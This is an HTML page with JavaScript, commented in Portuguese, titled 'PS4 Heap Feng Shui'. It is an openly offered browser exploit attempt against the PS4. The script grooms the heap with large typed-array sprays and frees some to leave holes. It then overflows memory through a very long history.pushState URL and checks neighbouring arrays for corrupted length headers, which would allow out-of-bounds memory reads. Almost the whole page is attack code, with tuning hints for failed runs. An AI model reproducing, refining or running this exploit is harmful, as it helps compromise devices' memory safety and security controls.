<!DOCTYPE html>
<html>
<head>
    <title>PS4 Heap Feng Shui</title>
    <style>
        body { background-color: #000; color: #fff; font-family: monospace; padding: 20px; }
        button { 
            font-size: 24px; padding: 20px; margin: 20px; cursor: pointer; 
            width: 100%; border: 2px solid #ff00ff; background: #222; color: #fff;
        }
        #log { border: 1px solid #555; padding: 10px; height: 300px; overflow: auto; color: cyan; }
        .win { color: #00ff00; font-weight: bold; font-size: 24px; background: #222; }
    </style>
</head>
<body>

    <h1>Heap Feng Shui: Ataque ao Metadata</h1>
    <p>Criando buracos para encaixar o exploit ao lado da vítima.</p>

    <button onclick="startFengShui()">INICIAR GROOMING & EXPLOIT</button>

    <div id="log">Pronto.</div>

    <script>
        const BASE_OFFSET = 709522;
        // Tamanho aproximado da string total (740KB). 
        // Vamos criar arrays um pouco maiores para garantir alinhamento.
        const ARRAY_SIZE = 0x10000; // 131072 elementos de 4 bytes = 524KB (Tente aumentar se falhar)
        const SPRAY_NUM = 400;      // Menos arrays, mas eles são gigantes
        
        var holes = [];
        var victims = [];

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML += msg + "<br>";
            el.scrollTop = el.scrollHeight;
        }

        function startFengShui() {
            log("1. Alocando memória massiva (Feng Shui)...");

            setTimeout(() => {
                // FASE 1: PREENCHIMENTO CONTÍNUO
                // Aloca pares: [LIXO] [VÍTIMA] [LIXO] [VÍTIMA]
                for (let i = 0; i < SPRAY_NUM; i++) {
                    // Uint32Array usa 4 bytes por elemento.
                    let arr = new Uint32Array(ARRAY_SIZE); 
                    arr.fill(0x41414141);
                    
                    // Salva referências alternadas
                    if (i % 2 === 0) {
                        holes.push(arr);   // Será deletado para virar buraco
                    } else {
                        victims.push(arr); // Será a vítima que checaremos
                    }
                }

                log("2. Criando buracos (Delete)...");
                
                // FASE 2: CRIAR BURACOS
                // Removemos as referências dos pares pares. O GC vai limpar.
                holes = null; 
                
                // Tentativa rudimentar de forçar Garbage Collection alocando lixo rápido
                try { new ArrayBuffer(1024 * 1024 * 100); } catch(e){}

                log("3. Disparando Overflow no buraco...");

                setTimeout(() => {
                    // FASE 3: INJEÇÃO
                    // A string deve cair num dos buracos deixados
                    let buffer = "A".repeat(BASE_OFFSET);
                    // O overflow de bytes seguros (0x01)
                    buffer += "\x01".repeat(32000); 

                    history.pushState({}, "pwn", "/" + buffer);

                    // FASE 4: CHECAGEM
                    log("4. Verificando cabeçalhos das vítimas...");
                    checkVictims();

                }, 1000); // Delay maior para o GC trabalhar
            }, 100);
        }

        function checkVictims() {
            let found = false;
            
            // O tamanho original esperado
            const expectedLen = ARRAY_SIZE;

            for (let i = 0; i < victims.length; i++) {
                try {
                    // Se o cabeçalho foi corrompido, o .length mudou!
                    if (victims[i].length !== expectedLen) {
                        log("<span class='win'>!!! SUCESSO !!!</span>");
                        log("Vítima Index: " + i);
                        log("Tamanho Original: " + expectedLen);
                        log("Novo Tamanho: " + victims[i].length);
                        log("Diferença Hex: 0x" + victims[i].length.toString(16));
                        found = true;
                        
                        // Se o tamanho ficou gigante, conseguimos leitura de memória completa!
                        break; 
                    }
                } catch (e) {
                    // Se der erro ao ler .length, é porque corrompeu o ponteiro do objeto.
                    // ISSO TAMBÉM É SUCESSO (Crash controlado)
                    log("<span class='win'>CRASH DETECTADO AO LER ARRAY " + i + "</span>");
                    found = true;
                    break;
                }
            }

            if (!found) {
                log("Falha. Nenhum vizinho afetado. Ajuste o tamanho do ARRAY_SIZE.");
                log("Dica: Tente mudar ARRAY_SIZE para 0x40000 (1MB) ou 0x10000.");
            }
        }
    </script>
</body>
</html>



